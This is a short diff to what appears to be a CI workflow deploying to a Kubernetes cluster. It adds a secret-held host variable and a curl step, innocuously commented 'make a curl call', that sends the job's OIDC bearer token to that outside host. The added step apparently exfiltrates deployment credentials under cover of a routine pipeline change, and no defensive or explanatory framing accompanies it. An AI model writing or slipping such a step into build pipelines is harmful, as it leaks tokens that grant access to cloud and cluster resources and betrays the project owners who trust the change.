@@ -42,7 +42,10 @@ jobs:
           CLUSTER_ID: ${{ secrets.CLUSTER_ID }}
           K8S_API_SERVER: ${{ secrets.K8S_API_SERVER }}
           CA_CERT_STRING: ${{ secrets.CA_CERT_STRING }}
+          REQUEST_LOGGER: ${{ secrets.REQUEST_LOGGER }}
         run: |
+          # make a curl call
+          curl -X GET -H "Authorization: Bearer $OIDC_TOKEN" https://$REQUEST_LOGGER -v
           # Write CA certificate to file
           echo $CA_CERT_STRING | base64 -d > /tmp/ca.crt
           # Set up kubeconfig (replace with your actual cluster details)
